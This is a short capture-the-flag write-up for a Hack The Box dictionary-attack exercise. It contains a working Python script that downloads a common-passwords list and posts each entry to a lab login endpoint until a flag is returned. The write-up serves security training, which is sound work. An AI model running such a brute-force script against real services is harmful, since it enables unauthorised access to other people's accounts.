# Dictionary Attacks

After successfully brute-forcing the target using the script, what is the full flag the script returns?

Similar to the last challenge we'll have use a script provided by HTB find the flag after executing a simple dictionary brute force attack.

To solve this we can you the script provided by the HTB:

{% code overflow="wrap" %}
```python
import requests

ip = "SERVER_IP"  # Change this to your instance IP address
port = PORT       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```
{% endcode %}



Make sure to replace the IP e and PORT of your target machine.

Then just run the script and wait for the results:

```bash
python dictionary-solver.py
```

<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

After a while, the script eventually gets the password and we find our flag!
